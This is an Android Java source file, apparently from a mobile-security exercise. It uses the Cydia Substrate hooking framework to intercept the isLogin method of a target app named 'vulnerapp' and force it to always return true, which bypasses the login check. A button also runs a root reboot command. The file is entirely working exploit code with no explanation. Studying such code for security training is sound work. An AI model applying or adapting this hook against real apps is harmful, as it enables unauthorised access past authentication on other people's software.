package com.example.wsunpachit.exploit;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import java.lang.reflect.Method;
import com.saurik.substrate.*;

import android.view.View;
import android.widget.Button;

public class BypassLoginSubstrate extends AppCompatActivity {


    static void initialize() {
        MS.hookClassLoad("com.example.wsunpachit.vulnerapp.LoginActivity", new MS.ClassLoadHook() {
            @SuppressWarnings({"unchecked", "rawtypes" })

            public void classLoaded(Class<?> resources) {
                Method methodToHook;

                try{
                    methodToHook = resources.getMethod("isLogin", String.class, String.class);
                }catch(NoSuchMethodException e){
                    methodToHook = null;
                }

                if (methodToHook == null) {
                    Log.v("cydia","No method found");
                }

                else{
                    MS.hookMethod(resources, methodToHook, new MS.MethodAlteration<Object, Boolean>() {
                        public Boolean invoked(Object _class, Object... args) throws Throwable
                        {
                            return true;
                        }
                    });
                }
            }
        });

    }



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_bypass_login_substrate);

        Button cmdRb = (Button) findViewById(R.id.cmdReboot);

        cmdRb.setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View v)
            {
                try {
                    Process proc = Runtime.getRuntime()
                            .exec(new String[]{ "su", "-c", "reboot" });
                    proc.waitFor();
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        });
    }
}
